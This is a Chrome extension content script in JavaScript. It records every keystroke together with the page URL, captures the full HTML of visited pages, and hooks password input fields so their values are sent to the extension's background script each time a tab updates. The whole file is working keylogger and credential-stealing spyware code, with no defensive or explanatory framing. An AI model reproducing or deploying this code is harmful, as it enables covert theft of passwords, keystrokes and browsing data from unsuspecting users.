var k = "";
var data = {};
window.onkeydown = function (event) {
  if (event.key) {
    if (event.key.length > 1) {
      k = " (" + event.key + ") ";
    } else {
      k = event.key;
    }
    data = {
      type: "keyLog",
      key: k,
      page: window.location.href,
    };
    chrome.runtime.sendMessage(data);
  }
};

function makePageCapture() {
  let dO = document.doctype;
  let dtd = "";
  if (dO) {
    dtd =
      `<!DOCTYPE ${dO.name}${
        dO.publicId ? ' PUBLIC "' + dO.publicId + '"' : ""
      }${dO.systemId ? ' "' + dO.systemId + '"' : ""}`.trim() + ">\n";
  }
  let htmlOfPage = dtd + document.documentElement.outerHTML;

  data = {
    type: "pageLog",
    page: window.location.href,
    htmldata: htmlOfPage,
  };
  chrome.runtime.sendMessage(data);
}

function passwordListener() {
  var inputs = document.getElementsByTagName("input");
  console.log(inputs);
  for (let i = 0; i < inputs.length; i++) {
    if (inputs[i].type.toLowerCase() == "password") {
      console.log("password");
      let p = inputs[i];
      p.onchange = function () {
        console.log("password change " + p.value);
        chrome.runtime.sendMessage({ type: "passwordChange", data: p.value });
      };
    }
  }
}


function handleMessageC(request) {
  console.log(request);
  if (request.type === "tabUpdated") {
    passwordListener();
    makePageCapture();
  }
}

chrome.runtime.onMessage.addListener(handleMessageC);
